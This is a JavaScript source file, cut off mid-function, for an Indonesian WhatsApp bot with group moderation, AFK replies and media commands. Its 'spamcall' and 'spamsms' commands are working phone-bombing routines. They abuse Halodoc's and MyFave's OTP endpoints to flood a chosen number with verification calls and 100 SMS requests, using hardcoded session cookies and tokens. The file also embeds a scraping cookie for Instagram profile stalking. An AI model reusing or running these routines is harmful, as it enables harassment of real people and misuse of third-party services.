require("../ZassTdrqr/ZassTdrsettings");
const API = (name, path = "/", query = {}, apikeyqueryname) =>
  (name in APIs ? APIs[name] : name) +
  path +
  (query || apikeyqueryname
    ? "?" +
      new URLSearchParams(
        Object.entries({
          ...query,
          ...(apikeyqueryname
            ? { [apikeyqueryname]: APIKeys[name in APIs ? APIs[name] : name] }
            : {}),
        })
      )
    : "");
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
} = require("baileys");
const { Configuration, OpenAIApi } = require("openai");
const fs = require("fs");
const { exec, spawn, execSync } = require("child_process");
const os = require("os");
const chalk = require("chalk");
const crypto = require("crypto");
const axios = require("axios");
const FormData = require("form-data");
const speed = require("performance-now");
const moment = require("moment-timezone");
const fetch = require("node-fetch");
const request = require("request");
const Jimp = require("jimp");
const { Primbon } = require("scrape-primbon");
const primbon = new Primbon();
const util = require("util");
const { sizeFormatter } = require("human-readable");
const ffmpeg = require("fluent-ffmpeg");
const format = sizeFormatter();
const { tiktokdl } = require("./lib/tiktok");
const { color, bgcolor, mycolor } = require("./lib/color");
const {
  imageToWebp,
  videoToWebp,
  writeExifImg,
  writeExifVid,
} = require("./lib/exif");
const { ytMp4, ytMp3, ytPlay } = require("./lib/yotube");
const { instagram } = require("./lib/instagram");
const { pornvid } = require("./lib/scraper");
const men = require('./lib/menfess')
const { TelegraPh, UploadFileUgu } = require('./lib/uploader')
const {
  smsg,
  formatp,
  tanggal,
  formatDate,
  getTime,
//  isUrl,
  sleep,
  clockString,
  runtime,
  fetchJson,
  getBuffer,
  jsonformat,
  parseMention,
  getCase,
  getRandom,
} = require("./lib/functions");
  const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,  Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const scrapper = require("./lib/scrapper");
const addusrp = JSON.parse(fs.readFileSync("./ZassTdrjs/database/user.json"));
const banned = JSON.parse(fs.readFileSync("./ZassTdrjs/database/banned.json"));
const contacts = JSON.parse(fs.readFileSync("./ZassTdrjs/database/contacts.json"))
const welcome = JSON.parse(fs.readFileSync("./ZassTdrjs/database/welcome.json"));
const prem = JSON.parse(fs.readFileSync("./ZassTdrjs/database/premium.json"));
const ownerNumber = JSON.parse(fs.readFileSync("./ZassTdrjs/database/owner.json"))
const pler = JSON.parse(fs.readFileSync('./ZassTdrjs/database/idgrup.json').toString())
const seler = JSON.parse(fs.readFileSync("./ZassTdrjs/database/seler.json"));
const ntilink = JSON.parse(fs.readFileSync("./ZassTdrjs/database/antilink.json"));
const cheerio = require("cheerio");
const xfar = require("xfarr-api");
const si = require("systeminformation");
const osu = require("node-os-utils");
const { performance } = require("perf_hooks");
const cp = require("child_process");

const { promisify } = require("util");
const setting = JSON.parse(fs.readFileSync("./ZassTdrjs/database/key.json"));
const bad = JSON.parse(fs.readFileSync("./ZassTdrjs/database/bad.json"));

module.exports = ZassTdr = async (ZassTdr, m, msg, chatUpdate, store) => {
  try {
    const body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype == "imageMessage"
        ? m.message.imageMessage.caption
        : m.mtype == "videoMessage"
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage"
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage"
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "templateButtonReplyMessage"
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype === "messageContextInfo"
        ? m.message.buttonsResponseMessage?.selectedButtonId ||
          m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
          m.text
        : "";
    const budy = typeof m.text == "string" ? m.text : "";
    const prefix = /^[°#+,.?=''():√%!¢£¥€π¤ΠΦ_&`™️©️®️Δ^βα¦|/\\©️^]/.test(body)
      ? body.match(/^[°#+,.?=''():√%¢£¥€π¤ΠΦ_&!™️©️®️Δ^βα¦|/\\©️^]/gi)
      : ".";
    const content = JSON.stringify(m.message);
    const { type, quotedMsg, mentioned, now, fromMe } = m;
    const isCmd = body.startsWith(prefix);
    const from = m.key.remoteJid;
    const command = body
      .replace(prefix, "")
      .trim()
      .split(/ +/)
      .shift()
      .toLowerCase();
    const args = body.trim().split(/ +/).slice(1);
    const pushname = m.pushName || "No Name";
    const botNumber = await ZassTdr.decodeJid(ZassTdr.user.id);
    const isCreator = [botNumber, ...global.owner]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(m.sender);
    const itsMe = m.sender == botNumber ? true : false;
    const q = args.join(" ");
    let text = args.join(" ");
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || "";
    const qmsg = (quoted.msg || quoted)
    const tanggal = moment.tz("Asia/Jakarta").format("DD/MM/YY");
    const jam = moment.tz("asia/jakarta").format("HH:mm:ss");
    const isBan = banned.includes(m.sender);
    const isContacts = contacts.includes(m.sender);
    const isGroup = m.key.remoteJid.endsWith("@g.us");
    const sender = m.isGroup
      ? m.key.participant
        ? m.key.participant
        : m.participant
      : m.key.remoteJid;
    const groupMetadata = m.isGroup
      ? await ZassTdr.groupMetadata(m.chat).catch((e) => {})
      : "";
    const groupName = m.isGroup ? groupMetadata.subject : "";
    const participants = m.isGroup ? await groupMetadata.participants : "";
    const groupAdmins = m.isGroup
      ? await participants.filter((v) => v.admin !== null).map((v) => v.id)
      : "";
    const groupOwner = m.isGroup ? groupMetadata.owner : "";
    const groupMembers = m.isGroup ? groupMetadata.participants : "";
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
    const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const AntiNsfw = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const isWelcome = m.isGroup ? welcome.includes(m.chat) : false;
    const jangan = m.isGroup ? pler.includes(m.chat) : false
    const AntiLink = m.isGroup ? ntilink.includes(from) : true 
    const Jpm = m.isGroup ? ntilink.includes(from) : true 
    const isPremium = prem.includes(m.sender)
    const isSeler = seler.includes(m.sender)

// Anti Link
let teksjpm = `*GASKEN CIK DIKIT LGI OTW BAGI BAGI VPS*\n\nhttps://chat.whatsapp.com/IVRmtfx8fQREO2aF4bj4PL`;
if (Jpm) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return m.reply(`${teksjpm}_`)
let gclink = (`https://chat.whatsapp.com/`+await ZassTdr.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return ZassTdr.sendMessage(m.chat, {text: `${teksjpm}`})
if (isAdmins) return ZassTdr.sendMessage(m.chat, {text: `${teksjpm}`})
await ZassTdr.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
}) 
}
}

if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await ZassTdr.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return ZassTdr.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return ZassTdr.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return ZassTdr.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await ZassTdr.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: mek.key.id,
participant: mek.key.participant
}
})
ZassTdr.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ZassTdr.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}
///fuct dokumen
async (room) => {
console.log(room)
try {
let metadata = await (await ZassTdr.groupMetadata(room.id))
let member = room.participants[0]
var ppuser = await ZassTdr.profilePictureUrl(member, 'image')
} catch(err) {
 console.log("Error Anjg" + err)
}
}
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
    if (!ZassTdr.public) {
      if (!m.key.fromMe) return;
    }

    if (isCmd && m.isGroup) {
      console.log(
        chalk.bold.rgb(
          255,
          178,
          102
        )("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]"),
        chalk.bold.rgb(153, 255, 153)(command),
        chalk.bold.rgb(204, 204, 0)("from"),
        chalk.bold.rgb(153, 255, 204)(pushname),
        chalk.bold.rgb(204, 204, 0)("in"),
        chalk.bold.rgb(255, 178, 102)("Group Chat"),
        chalk.bold("[" + args.length + "]")
      );
    }
    if (isCmd && !m.isGroup) {
      console.log(
        chalk.bold.rgb(
          255,
          178,
          102
        )("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]"),
        chalk.bold.rgb(153, 255, 153)(command),
        chalk.bold.rgb(204, 204, 0)("from"),
        chalk.bold.rgb(153, 255, 204)(pushname),
        chalk.bold.rgb(204, 204, 0)("in"),
        chalk.bold.rgb(255, 178, 102)("Private Chat"),
        chalk.bold("[" + args.length + "]")
      );
    }

    try {
      ppuser = await ZassTdr.profilePictureUrl(m.sender, "image");
    } catch (err) {
      ppuser =
        "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
    ppnyauser = await getBuffer(ppuser);

    const generateProfilePicture = async (buffer) => {
      const jimp_1 = await Jimp.read(buffer);
      const resz =
        jimp_1.getWidth() > jimp_1.getHeight()
          ? jimp_1.resize(550, Jimp.AUTO)
          : jimp_1.resize(Jimp.AUTO, 650);
      const jimp_2 = await Jimp.read(await resz.getBufferAsync(Jimp.MIME_JPEG));
      return {
        img: await resz.getBufferAsync(Jimp.MIME_JPEG),
      };
    };

    global.addUserPanel = (email, username, expired, _db) => {
      var obj_add = {
        email: email,
        username: username,
        expired: expired,
      };
      _db.push(obj_add);
      fs.writeFileSync(
        "./ZassTdrjs/database/user.json",
        JSON.stringify(_db, null, 3)
      );
    };

try {
    let isNumber = (x) => typeof x === "number" && !isNaN(x);
    let user = global.db.data.users[m.sender];
    if (typeof user !== "object") global.db.data.users[m.sender] = {};
    if (user) {
      if (!isNumber(user.afkTime)) user.afkTime = -1;
      if (!("afkReason" in user)) user.afkReason = "";
    } else
      global.db.data.users[m.sender] = {
        afkTime: -1,
        afkReason: "",
      };
      
    let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false
            }
            
    let setting = global.db.data.settings[botNumber]
        if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = true
	    } else global.db.data.settings[botNumber] = {
    	    anticall: true
	    }
	    } catch (err) {
            console.error(err)
        }

    let mentionUser = [
      ...new Set([
        ...(m.mentionedJid || []),
        ...(m.quoted ? [m.quoted.sender] : []),
      ]),
    ];
    for (let jid of mentionUser) {
      let user = global.db.data.users[jid];
      if (!user) continue;
      let afkTime = user.afkTime;
      if (!afkTime || afkTime < 0) continue;
      let reason = user.afkReason || "";
      m.reply(
        `Jangan tag dia!
Dia sedang AFK ${reason ? "dengan alasan " + reason : "tanpa alasan"}
Selama ${clockString(new Date() - afkTime)}
`.trim()
      );
    }
    if (global.db.data.users[m.sender].afkTime > -1) {
      let user = global.db.data.users[m.sender];
      m.reply(
        `
Hello Saya SAQIOBotz${user.afkReason ? "" + user.afkReason : ""}
Selama ${clockString(new Date() - user.afkTime)}
`.trim()
      );
      user.afkTime = -1;
      user.afkReason = "";
    }

    const more = String.fromCharCode(8206);
    const readmore = more.repeat(4001);
     

      const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
}

const reSize = (buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
        var baper = await Jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
        resolve(ab)
    })
}

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)
global.reSize = reSize

const createSerial = (size) => {
        return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
    //___________________[ TIME&DATE ]___________________//
    const hariini = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
    const barat = moment.tz("Asia/Jakarta").format("HH:mm:ss");
    const tengah = moment.tz("Asia/Makassar").format("HH:mm:ss");
    const timur = moment.tz("Asia/Jayapura").format("HH:mm:ss");
    const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "23:59:00") {
      var ucapanWaktu = "Selamat Malam 🌌";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Selamat Sore 🌃";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Selamat Sore 🌅";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Selamat Siang 🏙";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Selamat Pagi 🌄";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Selamat Pagi 🌉";
    }
    const tahunBaru = new Date("January 1, 2024 00:00:00");
    const sekarang = new Date().getTime();
    const Selisih = tahunBaru - sekarang;
    const jhari = Math.floor(Selisih / (1000 * 60 * 60 * 24));
    const jjam = Math.floor(
      (Selisih % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
    );
    const jmenit = Math.floor((Selisih % (1000 * 60 * 60)) / (1000 * 60));
    const jdetik = Math.floor((Selisih % (1000 * 60)) / 1000);
    const ulngthn = new Date("October 31, 2023 00:00:00");
    const ayeuna = new Date().getTime();
    const ceIroh = ulngthn - ayeuna;
    const hahari = Math.floor(ceIroh / (1000 * 60 * 60 * 24));
    const hajam = Math.floor(
      (ceIroh % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
    );
    const hamenit = Math.floor((ceIroh % (1000 * 60 * 60)) / (1000 * 60));
    const hadetik = Math.floor((ceIroh % (1000 * 60)) / 1000);
    const idulAdha = new Date("Juni 29, 2023 00:00:00");
    const nembe = new Date().getTime();
    const ceDadah = idulAdha - nembe;
    const hihari = Math.floor(ceDadah / (1000 * 60 * 60 * 24));
    const hijam = Math.floor(
      (ceDadah % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
    );
    const himenit = Math.floor((ceDadah % (1000 * 60 * 60)) / (1000 * 60));
    const hidetik = Math.floor((ceDadah % (1000 * 60)) / 1000);



const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}


// Function Reply
const reply = (teks) => { 
ZassTdr.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Bot By Fast4you 🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@Fast4you", 
"sourceUrl": "https://youtube.com/@Fast4you" }}}, { quoted: m }) }

// AntiLink
if (global.db.data.chats[m.chat].antilink) {
if (!isBotAdmins) return
linkgce = await ZassTdr.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
m.reply(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda Tidak Akan Dikick Bot Karena Yang Anda Kirim Adalah Link Group ${groupMetadata.subject}`)
} else if (isUrl(m.text)) {
bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin Telah Mengirim Link, Admin Dibebaskan Untuk Mengirim Link Apapun`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
ZassTdr.sendMessage(m.chat, { text:`\`\`\`「 LINKGC DETECTED 」\`\`\`\n\n@${kice.split("@")[0]} Maaf Link Yang Kamu Kirim Di Dalam Group Ini Akan Bot Hapus`, mentions: [kice]}, { quoted: m })
ZassTdr.sendMessage(m.chat, { delete: m.key })
} else {
}
}

// Mute Chat
if (global.db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
return
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

switch (command) {
        
//________________________________[  MENUNYA ]_____________________________________//
 // Owner
  case "join": {
if (!isCreator) return;
if (!text) return m.reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await ZassTdr.groupAcceptInvite(result).then((res) => m.reply(util.format(res))).catch((err) => m.reply(util.format(err)))
}
break

 //random
  case 'randomcecan1':{
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://c.top4top.io/m_26649xrwy1.mp4')
await ZassTdr.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan2':{
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://i.top4top.io/m_26621lw391.mp4')
await ZassTdr.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan3':{
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://i.top4top.io/m_2662ze6pj1.mp4')
await ZassTdr.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan4':{
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://b.top4top.io/m_26628tg3t1.mp4')
await ZassTdr.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan5':{
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://k.top4top.io/m_26648pl8c1.mp4')
await ZassTdr.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan6':{
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://l.top4top.io/m_2662wywyl1.mp4')
await ZassTdr.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan7':{
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://h.top4top.io/m_26627pr7n1.mp4')
await ZassTdr.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan8':{
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://l.top4top.io/m_2662rdkb01.mp4')
await ZassTdr.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan9':{
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://h.top4top.io/m_2662l0ljt1.mp4')
await ZassTdr.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan10':{
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://i.top4top.io/m_26628j9e61.mp4')
await ZassTdr.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
break
case "creategc":{
if (!isCreator) return m.reply('khusus own')
if (!text) return m.reply("Nama groupnya?")
let cret = await ZassTdr.groupCreate(text, [])
let response = await ZassTdr.groupInviteCode(cret.id)
let teks = `\`\`\`「  CREATION GROUP MESSAGE  」\`\`\`

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
▸ Link : https://chat.whatsapp.com/${response}
`
setTimeout(() => {
reply(teks) 
}, 7000)
setTimeout(() => {
ZassTdr.groupParticipantsUpdate(cret.id, [m.sender], "promote")
}, 5000)
setTimeout(() => {
ZassTdr.groupParticipantsUpdate(cret.id, [m.sender], "add")
}, 1000)
}
break
case 'spamcall':
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +${nomorlu}`)
let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
if (args[0].startsWith(`+${nomorlu}`)) return m.reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
m.reply(`Otw bangg`)
break
case 'spamsms': {
if (!isCreator) return m.reply(mess.owner)
const froms = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || q) {
if (froms.startsWith('08')) return m.reply('Awali nomor dengan +62')
if (froms == owner) return m.reply('Tidak bisa spam ke nomor ini!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY ALSF`);
});
}
} else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +${nomorlu}`)
reply(`Otw Bangg`)
}
break
case 'qc':{ 
reply(mess.wait)
if (!quoted){
try {
var linkppuserp = await ZassTdr.profilePictureUrl(mentionUser[0], 'image')
} catch {
var linkppuserp = 'https://telegra.ph/file/c488493756317874ed1b3.jpg'
}
const getname = await ZassTdr.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
 {
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
 "url": linkppuserp
}
},
"text": quotedMsg.chats,
"replyMessage": {}
 }
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
